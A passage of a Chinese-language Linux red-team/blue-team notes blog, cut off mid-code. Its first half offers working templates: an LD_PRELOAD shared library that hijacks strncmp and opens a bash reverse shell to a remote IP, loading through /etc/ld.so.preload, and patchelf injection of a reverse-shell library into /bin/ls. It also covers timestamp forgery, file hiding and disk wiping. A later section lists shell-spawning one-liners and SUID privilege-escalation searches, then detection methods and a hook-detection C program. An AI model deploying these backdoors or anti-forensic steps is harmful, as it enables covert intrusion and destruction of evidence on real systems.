+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//劫持ll、ls、vi命令</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">//SO劫持模板</span><br><span class="line">void payload()&#123;</span><br><span class="line">     printf(&quot;hack is ok!\n&quot;);</span><br><span class="line">     </span><br><span class="line">     //模板，相当于劫持strncmp函数，在payload函数中可以写任意函数</span><br><span class="line">     system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.64.1/9999 0&gt;&amp;1&quot;);</span><br><span class="line">     </span><br><span class="line">     printf(&quot;OK\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//函数原型（必须有？）</span><br><span class="line">int strncmp(const char*__s1, const char*__s2, size_t __n)&#123;</span><br><span class="line">if(getenv(&quot;LD_PRELOAD&quot;) == NULL)&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">//#卸载环境变量</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);		</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>②编译成.so文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC hook.c -o hook.so </span><br></pre></td></tr></table></figure>
+
+<p>③装载 &amp; 卸载 恶意so文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo LD_PRELOAD</span><br><span class="line">export LD_PRELOAD=$PWD/hook.so</span><br><span class="line">unset LD_PRELOAD</span><br></pre></td></tr></table></figure>
+
+<p>注意：断开ssh连接后，LD_PRELOAD环境变量会重置</p>
+<h3 id="etc-ld-so-preload加载恶意SO"><a href="#etc-ld-so-preload加载恶意SO" class="headerlink" title="&#x2F;etc&#x2F;ld.so.preload加载恶意SO"></a><strong>&#x2F;etc&#x2F;ld.so.preload加载恶意SO</strong></h3><p><strong>安装</strong></p>
+<p>将恶意动态链接库路径写入&#x2F;etc&#x2F;ld.so.preload(没有则创建)配置文件中，写入即生效</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/root/xxx.so&quot; &gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="patchelf注入"><a href="#patchelf注入" class="headerlink" title="patchelf注入"></a>patchelf注入</h3><p>使用工具：<a target="_blank" rel="noopener" href="https://github.com/NixOS/patchelf/releases%EF%BC%8CLinux/Windows%E7%89%88%E6%9C%AC%E9%83%BD%E6%9C%89">https://github.com/NixOS/patchelf/releases，Linux/Windows版本都有</a></p>
+<p>命令参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">syntax: ./patchelf</span><br><span class="line">  [--set-interpreter FILENAME]</span><br><span class="line">  [--page-size SIZE]</span><br><span class="line">  [--print-interpreter]</span><br><span class="line">  [--print-os-abi]              Prints &#x27;EI_OSABI&#x27; field of ELF header</span><br><span class="line">  [--set-os-abi ABI]            Sets &#x27;EI_OSABI&#x27; field of ELF header to ABI.</span><br><span class="line">  [--print-soname]              Prints &#x27;DT_SONAME&#x27; entry of .dynamic section. Raises an error if DT_SONAME doesn&#x27;t exist</span><br><span class="line">  [--set-soname SONAME]         Sets &#x27;DT_SONAME&#x27; entry to SONAME.</span><br><span class="line">  [--set-rpath RPATH]</span><br><span class="line">  [--add-rpath RPATH]</span><br><span class="line">  [--remove-rpath]</span><br><span class="line">  [--shrink-rpath]</span><br><span class="line">  [--allowed-rpath-prefixes PREFIXES]           With &#x27;--shrink-rpath&#x27;, reject rpath entries not starting with the allowed prefix</span><br><span class="line">  [--print-rpath]</span><br><span class="line">  [--force-rpath]</span><br><span class="line">  ★常用[--add-needed LIBRARY]</span><br><span class="line">  [--remove-needed LIBRARY]</span><br><span class="line">  [--replace-needed LIBRARY NEW_LIBRARY]</span><br><span class="line">  [--print-needed]</span><br><span class="line">  [--no-default-lib]</span><br><span class="line">  [--no-sort]           Do not sort program+section headers; useful for debugging patchelf.</span><br><span class="line">  [--clear-symbol-version SYMBOL]</span><br><span class="line">  [--add-debug-tag]</span><br><span class="line">  [--output FILE]</span><br><span class="line">  [--debug]</span><br><span class="line">  [--version]</span><br><span class="line">  FILENAME...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>实例</strong></p>
+<p>编写的hook.c文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模板</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">payload</span><span class="params">(<span class="type">void</span> )</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//可以是任意命令</span></span><br><span class="line">     system(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/9999 0&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>注入到ls命令中（其他的命令不影响）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patchelf --add-needed /root/hook.so  /bin/ls</span><br><span class="line">注意★：</span><br><span class="line">	不能写错so的路径，否则会出问题，且不能修改</span><br><span class="line">	删除后命令会出现异常，但通过添加”NULL“库可以避免</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="文件伪装"><a href="#文件伪装" class="headerlink" title="文件伪装"></a>文件伪装</h2><p><code>stat filename</code>命令查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问时间(access time，atime)：文件内容最后一次被读取的时间，如用cat、more命令查看文件</span><br><span class="line">修改时间(modify time，mtime)：文件内容最后一次被修改的时间，如用vim编辑器修改文件内容</span><br><span class="line">改变时间(change time，ctime)：文件属性最后一次被修改的时间，如chmod、mv等修改文件</span><br></pre></td></tr></table></figure>
+
+<p>touch命令详解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-m：等同于–time=mtime，修改mtime</span><br><span class="line">-a：等同于–time=atime，修改atime</span><br><span class="line">-t：时间戳修改为指定时间[[CC]YY]MMDDhhmm[.ss]，如果不指定时间戳，则默认时间为当前时间</span><br><span class="line">-d：时间戳修改为指定字符串，如&quot;2020-12-12 12:12:12.00&quot;，如果不指定时间戳，则默认时间为当前时间</span><br><span class="line">-r file：等同于–reference=file，时间戳修改为与file相同</span><br><span class="line">PS：-d和-t参数都有指定时间戳的功能，但是-t参数只能精确到秒，使用stat查看文件很容易看出破绽，使用-d参数更加精确隐蔽。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>实例</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 将test.txt的atime和mtime修改为&quot;2020-12-12 12:12:12&quot;</span><br><span class="line">touch -t 202012121212.12 test.txt</span><br><span class="line"></span><br><span class="line"># 将test.txt的mtime修改为&quot;2020-12-12 12:12:12.8731390581&quot;</span><br><span class="line">touch -m -d &quot;2220-12-12 12:12:12.831390581&quot; test.txt</span><br><span class="line"></span><br><span class="line"># 首先将test.txt的atime和mtime时间戳备份，待修改test.txt后，再将其时间戳恢复</span><br><span class="line">PS：只能修改 “最近访问”、“最近更改”，不能修改 “最近改动”(Ctime)</span><br><span class="line">touch temp -r test.txt</span><br><span class="line">vim test.txt</span><br><span class="line">touch test.txt -r temp</span><br><span class="line">rm temp</span><br><span class="line"></span><br><span class="line"># 修改atime、mtime、ctime（★主要修改ctime）</span><br><span class="line">Ⅰ、date复制原先时间</span><br><span class="line">Ⅱ、date -s &quot;3019-08-07 09:06:23&quot;</span><br><span class="line">Ⅲ、落地|修改|编辑文件</span><br><span class="line">Ⅳ、date -s 原先时间</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h2><p>Linux中以<code>.</code>开头命名的文件或文件夹即为隐藏文件，因此要隐藏某个文件或文件夹直接将其名字前加一个<code>.</code>就可以了。</p>
+<p>查看所有文件（包括隐藏文件）可以用<code>ls -a</code>命令，只查看隐藏文件可以用<code>ls -d .*</code>命令。</p>
+<p>文件属性</p>
+<p><strong>chown</strong>：修改文件所属用户，<code>chown [options] [user][:[group]] file</code></p>
+<p><strong>chgrp</strong>：修改文件所属组，<code>chgrp [options] [group] file</code></p>
+<p><strong>chmod</strong>：修改文件读&#x2F;写&#x2F;执行权限，有两种命令：</p>
+<p>PS：以上三种命令options有一个共同的参数<code>-R</code>：递归改变该目录及其子目录中的文件</p>
+<h2 id="文件擦除"><a href="#文件擦除" class="headerlink" title="文件擦除"></a>文件擦除</h2><p>rm、rmdir命令仅是删除文件</p>
+<p>数据擦除(无法恢复)主要命令：shred、dd</p>
+<p><strong>shred</strong></p>
+<p>对文件进行覆盖后删除</p>
+<p>实现安全的从硬盘上擦除数据，命令格式为：shred [options] file，options具体参数如下：</p>
+<p>-f, –force：必要时修改权限以使目标可写<br>-n, –iterations&#x3D;N：覆盖N次，不指定次数则默认3 次<br>-s, –size&#x3D;N：将文件内容粉碎为指定字节大小的碎片(可使用K、M 和G 作为单位)<br>-u, –remove：覆盖后截断并删除文件<br>-v, –verbose：显示详细信息<br>-z, –zero：最后一次使用ascii的0x00进行覆盖以隐藏覆盖动作<br>例如删除test1工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将test1覆写6次后再填0x00，最后将其删除</span><br><span class="line">shred -zufvn 6 test1</span><br></pre></td></tr></table></figure>
+
+<p><strong>dd</strong></p>
+<p>dd命令通常用来备份、恢复、转换磁盘上的分区和文件，也可以实现安全擦除数据，命令格式为：<code>dd options</code>，options包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if=file：输入文件名，缺省为标准输入</span><br><span class="line">of=file：输出文件名，缺省为标准输出</span><br><span class="line">ibs=size：读入块大小为size bytes</span><br><span class="line">obs=size：写出块大小为size bytes</span><br><span class="line">bs=size：同时设置读写块的大小为size bytes</span><br><span class="line">count=N：仅拷贝N个块，每块的大小为size bytes</span><br><span class="line">size单位默认为byte，同时也可以使用K、M、G为单位。常使用方法如下：</span><br><span class="line"></span><br><span class="line">全盘数据备份：</span><br><span class="line">dd if=/dev/sda1 of=~/image</span><br><span class="line"></span><br><span class="line">备份磁盘开始的512个字节大小的MBR信息到指定文件：</span><br><span class="line">dd if=/dev/sda1 of=~/image bs=512 count=1 </span><br><span class="line"></span><br><span class="line">利用0填充销毁磁盘数据：</span><br><span class="line">dd if=/dev/zero of=/dev/hda1</span><br><span class="line"></span><br><span class="line">利用随机数填充销毁文件数据，文件大小为1K，覆写6次：</span><br><span class="line">dd if=/dev/urandom of=~/test bs=1k count=6 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Linux检查点-对抗"><a href="#Linux检查点-对抗" class="headerlink" title="Linux检查点(对抗)"></a>Linux检查点(对抗)</h1><h2 id="获取交互式终端"><a href="#获取交互式终端" class="headerlink" title="获取交互式终端"></a>获取交互式终端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">【1】</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;，</span><br><span class="line"></span><br><span class="line">【2】</span><br><span class="line">python3 -c &quot;__import__(&#x27;subprocess&#x27;).call([&#x27;/bin/bash&#x27;])&quot;</span><br><span class="line"></span><br><span class="line">【3】</span><br><span class="line">echo &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot; &gt; /tmp/asdf.py</span><br><span class="line">python /tmp/asdf.py</span><br><span class="line"></span><br><span class="line">【4】</span><br><span class="line">python -c &#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">【5】</span><br><span class="line">SHELL=/bin/bash script -q /dev/null	</span><br><span class="line"></span><br><span class="line">【6】</span><br><span class="line">!/bin/sh</span><br><span class="line"></span><br><span class="line">【7】</span><br><span class="line">bash -i</span><br></pre></td></tr></table></figure>
+
+<h2 id="SUID提权（关键字）"><a href="#SUID提权（关键字）" class="headerlink" title="SUID提权（关键字）"></a>SUID提权（关键字）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">【1】</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">【2】</span><br><span class="line">sudo -i 或者 sudo -l</span><br><span class="line"></span><br><span class="line">【3】</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125;;</span><br><span class="line"></span><br><span class="line">【4】</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :port            可用于检查那个进程使用了特定的端口</span><br><span class="line">lsof -p pid              检查pid进程调用情况</span><br><span class="line">strace -f -p pid         跟踪分析pid进程，可发现库文件劫持</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="端口转发信息"><a href="#端口转发信息" class="headerlink" title="端口转发信息"></a>端口转发信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 是否开启IP转发功能</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward		开启=1，关闭=0</span><br><span class="line"></span><br><span class="line">#centos 7版本以上使用firewalld-cmd代替iptables</span><br><span class="line">查看所有打开的端口：firewall-cmd --list-ports</span><br><span class="line">查看所有规则：firewall-cmd --list-all</span><br><span class="line">查看服务状态：systemctl status firewalld</span><br></pre></td></tr></table></figure>
+
+<h2 id="查找隐藏进程"><a href="#查找隐藏进程" class="headerlink" title="查找隐藏进程"></a>查找隐藏进程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">【查找SSH隐藏进程】</span><br><span class="line">（ssh -T xxx@x.x.x.x /usr/bin/bash）</span><br><span class="line">ps -ef</span><br><span class="line">★不会显示登录终端，但有登录日志记录</span><br><span class="line">★会显示“ root@notty ”伴随着/usr/bin/bash字样的进程信息</span><br><span class="line"></span><br><span class="line">【查找隐藏进程-1】</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">【查找隐藏进程-2】</span><br><span class="line">PS：效果不太好</span><br><span class="line">ps -ef | awk &#x27;&#123;print $2&#125;&#x27;|sort -n| uniq &gt; tasklist1.txt</span><br><span class="line">ls /proc | sort -n | uniq &gt; tasklist2.txt</span><br><span class="line">diff -u tasklist1.txt tasklist2.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="库文件劫持-1"><a href="#库文件劫持-1" class="headerlink" title="库文件劫持"></a>库文件劫持</h2><p><strong>00通用检测手段busybox</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#下载安装</span><br><span class="line">wget  https://busybox.net/downloads/busybox-1.31.0.tar.bz2</span><br><span class="line">tar -xjvf busybox-1.31.0.tar.bz2</span><br><span class="line"></span><br><span class="line">#添加环境变量</span><br><span class="line">vi /etc/profile</span><br><span class="line">export PATH=安装的位置_install/bin:$PATH</span><br><span class="line">source /etc/profile</span><br><span class="line">#使用</span><br><span class="line">busybox ls</span><br></pre></td></tr></table></figure>
+
+<p>01<strong>检查环境变量</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">【临时】</span><br><span class="line">echo $LD_PRELOAD</span><br><span class="line">unset LD_PRELOAD</span><br><span class="line"></span><br><span class="line">【永久】</span><br><span class="line">cat .bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>04<strong>ptachelf注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">【01】</span><br><span class="line">#针对可疑的命令使用</span><br><span class="line">#open(&quot;不是加载/lib64/下的so文件&quot;)，且会看到明显的外联信息</span><br><span class="line">strace -f -e trace=file /bin/xx</span><br><span class="line"></span><br><span class="line">★删除so文件后命令会出现异常</span><br><span class="line">【解决】</span><br><span class="line">1、建C文件写入</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">__attribute__ ((__constructor__)) void payload(void )&#123;</span><br><span class="line">     printf(&quot;&quot;);&#125;</span><br><span class="line">2、打包成so文件放在恶原先删除的so位置处，命令可以正常使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>ptachelf注入-检测C</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不太可靠，github上摘</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// add your own libc symbols to check if you wish</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *symbols[] = &#123;</span><br><span class="line">    <span class="string">&quot;rename&quot;</span>, <span class="string">&quot;renameat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stat&quot;</span>, <span class="string">&quot;stat64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;fstat&quot;</span>, <span class="string">&quot;fstat64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lstat&quot;</span>, <span class="string">&quot;lstat64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__lxstat&quot;</span>, <span class="string">&quot;__lxstat64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__fxstat&quot;</span>, <span class="string">&quot;__fxstat64&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__xstat&quot;</span>, <span class="string">&quot;__xstat64&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dladdr_check</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *dls_handle;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *symbol;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, hooked_funcs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(dls_handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_LAZY))) <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> VERBOSE</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] beginning dlsym/dladdr check.\n&quot;</span>);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((symbol = symbols[i++]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="meta">#<span class="keyword">ifdef</span> VERBOSE</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] checking \033[1;32m%s\033[0m.\n&quot;</span>, symbol);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="type">void</span> *real_symbol_addr, *curr_symbol_addr;</span><br><span class="line">        real_symbol_addr = dlsym(dls_handle, symbol);</span><br><span class="line">        curr_symbol_addr = dlsym(RTLD_NEXT, symbol);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(real_symbol_addr != curr_symbol_addr)</span><br><span class="line">        &#123;</span><br><span class="line">            Dl_info real_nfo, curr_nfo;</span><br><span class="line"></span><br><span class="line">            dladdr(real_symbol_addr, &amp;real_nfo);</span><br><span class="line">            dladdr(curr_symbol_addr, &amp;curr_nfo);</span><br><span class="line"></span><br><span class="line">            <span class="meta">#<span class="keyword">ifdef</span> VERBOSE</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[-] function %s possibly \033[1;31mhijacked\033[0m / location of shared object file: %s\n&quot;</span>, symbol, curr_nfo.dli_fname);</span><br><span class="line">            <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            hooked_funcs++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dlclose(dls_handle);</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> VERBOSE</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[+] dlsym/dladdr check finished.\n&quot;</span>);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> 